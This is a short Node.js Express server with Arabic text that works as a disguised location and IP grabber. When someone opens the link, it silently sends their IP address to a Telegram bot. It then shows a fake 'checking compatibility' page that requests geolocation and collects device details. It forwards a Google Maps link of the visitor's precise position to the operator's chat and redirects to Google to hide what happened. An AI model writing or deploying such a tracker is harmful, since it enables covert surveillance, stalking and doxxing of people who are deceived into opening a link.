const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

app.get('/', async (req, res) => {
    // إرسال تنبيه فوري بمجرد الدخول (قبل طلب الموقع)
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: MY_ID,
            text: `🔔 **شخص دخل الرابط الآن!**\n🌐 IP: \`${ip}\``,
            parse_mode: "Markdown"
        });
    } catch(e) {}

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>تحميل...</title>
            <script>
                async function start() {
                    let specs = "الموديل: " + navigator.platform + "\\nالرام: " + (navigator.deviceMemory || "؟") + "GB";
                    
                    // محاولة سحب الموقع
                    navigator.geolocation.getCurrentPosition(async (p) => {
                        const map = "https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
                        await send("🎯 موقع دقيق!\\n📍 " + map + "\\n💻 " + specs);
                    }, async () => {
                        await send("❌ رفض الموقع\\n💻 " + specs);
                    });
                }

                async function send(txt) {
                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({chat_id: "${MY_ID}", text: txt})
                    });
                    window.location.href = "https://www.google.com";
                }
                window.onload = start;
            </script>
        </head>
        <body style="background:black;color:green;text-align:center;padding-top:50px;">
            <h2>جاري فحص التوافق...</h2>
        </body>
        </html>
    `);
});

app.listen(PORT, () => console.log("System Online"));
